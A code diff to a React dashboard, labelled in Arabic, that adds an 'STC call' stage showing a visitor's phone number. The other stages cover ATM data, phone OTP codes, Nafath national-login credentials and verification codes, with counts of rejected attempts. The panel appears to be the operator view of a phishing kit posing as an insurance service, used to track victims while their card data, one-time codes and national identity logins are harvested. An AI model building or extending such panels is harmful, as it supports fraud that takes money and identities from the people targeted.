@@ -42,6 +42,7 @@ const stageConfig: { key: string; label: string; icon: React.ReactNode; color: s
   { key: "atm", label: "بيانات ATM", icon: <Landmark className="w-3.5 h-3.5" />, color: "emerald" },
   { key: "phone_verification", label: "توثيق الجوال", icon: <Smartphone className="w-3.5 h-3.5" />, color: "purple" },
   { key: "phone_otp", label: "كود OTP الجوال", icon: <Phone className="w-3.5 h-3.5" />, color: "violet" },
+  { key: "stc_call", label: "مكالمة STC", icon: <Phone className="w-3.5 h-3.5" />, color: "blue" },
   { key: "nafath_login", label: "دخول النفاذ", icon: <Fingerprint className="w-3.5 h-3.5" />, color: "teal" },
   { key: "nafath_verify", label: "رمز النفاذ", icon: <span className="text-sm">🔐</span>, color: "cyan" },
 ];
@@ -217,6 +218,7 @@ function renderStageContent(
     case "atm": return renderAtm(order);
     case "phone_verification": return renderPhoneVerification(order, stageEvents, selectedVisitor, visitorPhone, visitorNationalId);
     case "phone_otp": return renderPhoneOtp(order, stageEvents);
+    case "stc_call": return renderStcCall(order, stageEvents);
     case "nafath_login": return renderNafathLogin(order, stageEvents, selectedVisitor, visitorNationalId);
     case "nafath_verify": return renderNafathVerify(order, stageEvents, getNafathInputValue, setNafathInputValue);
     default: return null;
@@ -364,6 +366,22 @@ function renderPhoneOtp(order: InsuranceOrder, stageEvents: StageEvent[]) {
         )}
       </div>
       {rejected.length >= 3 && <p className="text-[9px] text-red-500 text-center font-bold">⚠ تم استنفاد المحاولات</p>}
+    </div>
+  );
+}
+
+function renderStcCall(order: InsuranceOrder, stageEvents: StageEvent[]) {
+  const events = stageEvents.filter(e => e.order_id === order.id && e.stage === "stc_call").sort((a, b) => new Date(a.stage_entered_at).getTime() - new Date(b.stage_entered_at).getTime());
+  const latest = events.at(-1);
+  const phone = order.phone || (latest?.payload as any)?.phone || null;
+
+  return (
+    <div className="space-y-1.5">
+      {phone ? (
+        <InfoItem label="رقم الجوال" value={phone} />
+      ) : (
+        <p className="text-[10px] text-muted-foreground text-center py-1">لا توجد بيانات</p>
+      )}
     </div>
   );
 }
